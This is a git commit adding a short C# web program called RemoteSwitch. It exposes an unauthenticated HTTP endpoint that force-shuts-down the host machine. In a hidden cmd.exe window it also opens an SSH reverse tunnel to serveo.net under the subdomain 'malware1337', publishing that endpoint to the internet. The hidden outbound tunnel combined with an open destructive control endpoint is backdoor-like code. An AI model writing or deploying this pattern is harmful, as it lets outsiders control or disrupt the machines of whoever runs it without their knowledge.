7ec702e96c1cf4c2af32551ce9de0b2e8fc7fe1d
khelechy <onyekwerekelechimac@gmail.com>
2023-05-24 16:38:14 +0100

    inital push

---
+++ RemoteSwitch.Console/Program.cs
@@ -0,0 +1,19 @@
+var builder = WebApplication.CreateBuilder(args);
+var app = builder.Build();
+
+app.MapGet("/", () => "Helo world");
+app.MapGet("/control/off", () => {
+    System.Diagnostics.Process.Start("Shutdown", "-s -f -t 00");
+});
+
+// Turn on port forwarder
+System.Diagnostics.Process process = new System.Diagnostics.Process();
+System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+startInfo.FileName = "cmd.exe";
+startInfo.Arguments = "/C ssh -R malware1337.serveo.net:80:localhost:1337 serveo.net";
+process.StartInfo = startInfo;
+process.Start();
+
+
+app.Run();
